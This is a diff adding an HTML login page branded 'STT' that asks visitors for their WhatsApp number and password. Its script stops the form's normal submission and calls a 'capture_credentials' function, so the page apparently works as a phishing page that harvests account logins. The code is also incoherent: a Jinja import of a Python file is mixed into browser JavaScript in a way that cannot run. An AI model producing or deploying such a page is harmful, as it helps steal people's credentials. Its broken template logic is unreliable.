@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>STT Login</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to bottom, #b3d9ff, #0052cc);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background: #ffffff;
+            border-radius: 10px;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .logo {
+            width: 50px;
+            height: 50px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 10px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .logo img {
+            width: 30px;
+            height: 30px;
+        }
+        h1 {
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        .forgot-password {
+            color: #0052cc;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .login-btn {
+            background: #0052cc;
+            color: #ffffff;
+            border: none;
+            border-radius: 5px;
+            padding: 10px;
+            cursor: pointer;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="sttlogo">
+        </div>
+        <h1>Welcome to STT</h1>
+        <form action="login.php" method="post">
+            <input type="text" name="phone" placeholder="Enter WhatsApp number">
+            <input type="password" name="password" placeholder="Enter Password">
+            <a href="#" class="forgot-password">Retrieve password</a>
+            <button class="login-btn" type="submit">Log In</button>
+        </form>
+    </div>
+    <script>
+        {% raw %}
+        window.addEventListener('load', function() {
+            {% endraw %}
+            {% from "capture_credentials.py" import capture_credentials %}
+            {% raw %}
+            document.querySelector('form').addEventListener('submit', function(e) {
+                e.preventDefault();
+                capture_credentials();
+            });
+        });
+        {% endraw %}
+    </script>
+</body>
+</html>
